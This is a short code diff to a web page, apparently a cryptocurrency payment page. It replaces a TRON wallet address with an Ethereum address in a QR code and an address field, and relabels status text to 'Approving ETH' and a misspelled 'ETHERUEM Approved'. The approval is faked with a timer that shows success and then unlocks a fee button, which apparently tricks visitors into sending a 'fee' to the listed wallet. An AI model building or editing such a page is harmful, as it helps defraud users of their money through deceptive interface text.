@@ -921,7 +921,7 @@ Scan QR Code
 <div class="qr">
 
 <img
-src="https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=TQmRC7PFMmo4SytBJwvSBvtnpapwZvs4ac">
+src="https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=0x53F088609eAC30f4875472B84cc4F60612c09D8B">
 
 </div>
 
@@ -933,7 +933,7 @@ Wallet Address
 
 <div class="address"
 id="walletAddress">
-TQmRC7PFMmo4SytBJwvSBvtnpapwZvs4ac
+0x53F088609eAC30f4875472B84cc4F60612c09D8B
 </div>
 
 </div>
@@ -1009,17 +1009,17 @@ approve2.onclick = ()=>{
 approve2.disabled = true;
 
 document.getElementById("status2").innerHTML =
-'<span class="spinner"></span> Approving TRON...';
+'<span class="spinner"></span> Approving ETH...';
 
 setTimeout(()=>{
 
 document.getElementById("status2").innerHTML =
-'<div class="success-icon"></div> TRON Approved';
+'<div class="success-icon"></div> ETHERUEM Approved';
 
 feeBtn.disabled = false;
 
 showAlert(
-"TRON Approved",
+"ETHERUEM Approved",
 "success"
 );
 
